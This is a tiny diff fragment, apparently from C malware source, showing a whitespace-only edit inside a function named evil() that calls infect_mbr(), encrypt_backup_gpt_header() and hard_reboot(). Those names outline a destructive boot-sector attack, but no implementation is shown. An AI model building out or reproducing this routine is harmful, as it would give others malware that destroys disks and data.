@@ -108,7 +108,7 @@ void evil()
 		{
 			infect_mbr();
 			encrypt_backup_gpt_header();
-		    hard_reboot();
+		    	hard_reboot();
 		}
 	}
 }
